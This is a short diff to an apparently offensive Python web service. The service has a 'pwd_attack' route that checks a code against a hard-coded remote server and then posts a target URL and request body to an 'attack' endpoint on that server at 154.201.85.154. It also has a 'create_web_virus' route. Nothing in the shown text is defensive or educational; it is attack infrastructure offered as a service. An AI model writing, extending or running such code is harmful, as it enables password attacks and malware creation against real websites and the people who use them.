@@ -14,6 +14,7 @@ import threading
 import time
 from urllib.parse import unquote
 import qrcode
+import json
 
 
 import config_loader as config_loader
@@ -54,18 +55,16 @@ def pwd_attack():
         check = data[1]
         body = ''
 
-        for i in range(1, len(data)):
+        for i in range(2, len(data)):
             body += data[i] +'\n'
         body = body.strip()
-
         r = requests.post('http://154.201.85.154:11111/check_ip_check/'+check)
-        if r == 'ok':
-            pass
+        if json.loads(r.text)['message'] == 'ok':
+            attack_requests = requests.post('http://154.201.85.154:11111/attack_hasjdfjiqu489uodsfhjoasjr9w4ruiosidfjsdlo',data=url+'\n'+body)
+            return attack_requests.text
         else:
             return 'check code error.'
-
-        return 'ok'
-
+        
 @app.route('/create_web_virus/<user>/<pwd>' , methods=['GET'])
 def create_web_virus(user , pwd):
     # 限制每个IP对制定api的访问.
